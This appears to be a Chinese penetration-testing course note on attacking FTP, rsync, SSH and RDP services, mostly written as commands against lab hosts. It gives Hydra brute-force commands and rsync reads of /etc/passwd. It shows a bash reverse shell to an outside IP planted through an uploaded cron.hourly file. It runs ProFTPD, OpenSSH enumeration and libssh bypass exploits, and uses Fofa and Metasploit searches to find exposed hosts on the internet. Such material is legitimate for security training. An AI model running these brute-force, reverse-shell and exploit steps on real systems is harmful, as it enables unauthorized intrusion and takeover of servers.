![1649599950471-12d400a9-f9b8-430a-9156-3450f0604935.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134249066-250391190.png)

```plain
#知识点：
1、服务攻防-远程控制&文件传输等
2、远程控制-RDP&RDP&弱口令&漏洞
3、文件传输-FTP&Rsync&弱口令&漏洞

#章节内容：
常见服务应用的安全测试：
1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击

#前置知识：
应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等
```

- 口令猜解-Hydra-FTP&RDP&SSH

```plain
https://github.com/vanhauser-thc/thc-hydra
可以自己安装
也可以使用kali自带
kali下载：https://www.kali.org/get-kali/
hydra是一个自动化的爆破工具，暴力破解弱密码，
是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可
-s PORT 可通过这个参数指定非默认端口。
-l LOGIN 指定破解的用户，对特定用户破解。
-L FILE 指定用户名字典。
-p PASS 小写，指定密码破解，少用，一般是采用密码字典。
-P FILE 大写，指定密码字典。
-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。
-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
-M FILE 指定目标列表文件一行一条。
-o FILE 指定结果输出文件。
-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
-t TASKS 同时运行的线程数，默认为16。
-w TIME 设置最大超时的时间，单位秒，默认是30s。
-v / -V 显示详细过程。
server 目标ip
service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。
例子：
FTP：文件传输协议
RDP：Windows远程桌面协议
SSH：Linux安全外壳协议


ftp爆破：hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V
ssh爆破：hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V
rdp爆破：hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V

字典：fuzzDicts-master项目
```

- 配置不当-未授权访问-Rsync文件备份

```plain
rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。实现文件的传输和数据库的同步，保证文件的结构同步。
实现环境：vulfocus.io

判断存在：
rsync rsync://123.58.236.76:33825/
```

![1649659288712-dfd594cc-7a7b-4a12-9175-31a611bbe26c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303201-1413884695.png)

```plain
利用：
-读取文件：rsync rsync://123.58.236.76:33825/src/
-下载文件：rsync rsync://123.58.236.76:33825/src/etc/passwd ./
-上传文件：rsync -av passwd rsync://123.58.236.76:33825/src/tmp/passwd
```

![1649659394435-2b3be369-c373-41e3-9338-a6d03887983f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303418-1294415928.png)

```plain
反弹shell：

1、获取信息：
rsync rsync://123.58.236.76:33825/src/etc/crontab /home/xiaodi/cron.txt

/home/xiaodi/cron.txt文件内容：这个就是计划任务内容（目标主机）
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

计时任务表：17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
这个代表17分钟会运行一个/etc/cron.hourly文件，那么对这个文件进行修改。
```

![1649659900618-3e870408-c001-43a0-8163-8bb27b10ba50.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303889-1472009390.png)

```plain
2.创建文件 
touch shell 
vim shell

/bin/bash -i >& /dev/tcp/47.100.167.248/1111 0>&1(写在shell文件里面)
chmod +x shell		
```

![1649660309282-ea99d0c1-5b38-4492-8047-47e20c9c05cf.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303524-744468530.png)

```plain
3、上传文件 
rsync -av shell rsync://123.58.236.76:33825/src/etc/cron.hourly 

4、等待接受反弹
nc -lvvp 1111

但是这个靶场只能10分钟，所以没办法看到效果。
```

- 高端课程-直接搜哈-MSF&Fofaviewer

```plain
fofa项目：https://github.com/wgpsec/fofa_viewer

启动：G:\java14\bin\java.exe -jar fofaviewer.jar

搜索关键字：port="873"
```

![1649660888031-3b6ec0ca-cf12-49d2-9eec-f1115c210b4d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134304107-1142470505.png)

```plain
查询到结果导出，然后在启动msf

msfconsole
use auxiliary/scanner/rsync/modules_list
set rhosts file:/home/xiaodi/ips.txt
set threads 10
run
```

![1649661298366-b750e2fc-0bef-4d33-9959-18ad9b978e29.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303758-1984740771.png)

- 协议漏洞-应用软件-FTP&Proftpd搭建

```plain
环境：http://vulfocus.io/#/dashboard

利用：https://github.com/t0kx/exploit-CVE-2015-3306
直接用到exp:
G:\python38\python.exe exploit.py --host 123.58.236.76 --port 55968 --path "/var/www/html/"
```

![1649662297498-ed81bc57-bda8-4858-b859-15d7df328ae6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303873-428417804.png)

```plain
正常来说，他会在在当前目录创建一个backdoor.php文件，然后我们访问：http://123.58.236.76:27023/backdoor.php?cmd=id就可以执行后门
```

![1649662788119-a0993c59-1e0c-4372-aa3d-188a592b74bf.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303893-984914212.png)

- 协议漏洞-应用软件-SSH&libssh&Openssh

```plain
-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778
CVE-2014-0160 版本很少
ssh -V查看版本

危害：https://blog.csdn.net/yangbz123/article/details/109601357
影响版本： OpenSSL 1.0.2-beta， OpenSSL 1.0.1 - OpenSSL 1.0.1f
```

![1649663075362-cd137db4-b885-4f37-b5ed-4e243a717967.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134303973-389413545.png)

```plain
cve_2020_15778 价值不高

要实现该漏洞必须知道ssh用户密码，但是一般来说ssh是阻止连接的,(绑定了ip不需要外部ip进行连接)。这个时候我们就可以利用这个漏洞进行连接。

ssh连接不了，利用这个漏洞来进行连接。
CVE-2018-15473-用户名枚举
环境：http://vulfocus.io/#/dashboard
意义：在猜解用户的时候，可以针对其他用户的密码测试


利用：https://github.com/Rhynorater/CVE-2018-15473-Exploit
安装：
G:\python38\Scripts\pip3.exe install -r requirements.txt
G:\python38\Scripts\pip3.exe install paramiko==2.4.1
G:\python38\python.exe sshUsernameEnumExploit.py --port 62101 --userList exampleInput.txt 123.58.236.76
```

![1649663727676-b44dad00-8ab8-4962-bb13-d8f5dc6817b7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134304189-279257670.png)

```plain
-libssh 身份验证绕过（CVE-2018-10933）

参考：https://www.seebug.org/vuldb/ssvid-97614

执行：G:\python38\python.exe libssh.py 123.58.236.76 31548 "id"

fofa搜索："libssh"&&port="22"
```

![1649664398536-132c17f6-1d48-48c9-8b4c-85c0bf93f7cc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134304262-920452213.png)